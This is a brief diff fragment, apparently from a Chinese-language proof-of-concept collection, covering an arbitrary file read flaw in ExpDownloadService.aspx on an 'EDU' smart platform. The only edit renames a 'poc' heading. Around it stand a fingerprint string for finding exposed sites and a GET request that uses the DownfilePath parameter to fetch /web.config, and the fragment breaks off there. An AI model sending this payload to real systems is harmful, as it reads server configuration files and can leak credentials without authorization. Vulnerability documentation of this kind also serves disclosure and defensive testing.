@@ -8,7 +8,7 @@ EDU某智慧平台ExpDownloadService.aspx任意文件读取漏洞，可能导致
 body="custom/blue/uimaker/easyui.css"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /ExpDownloadService.aspx?DownfilePath=/web.config HTTP/1.1
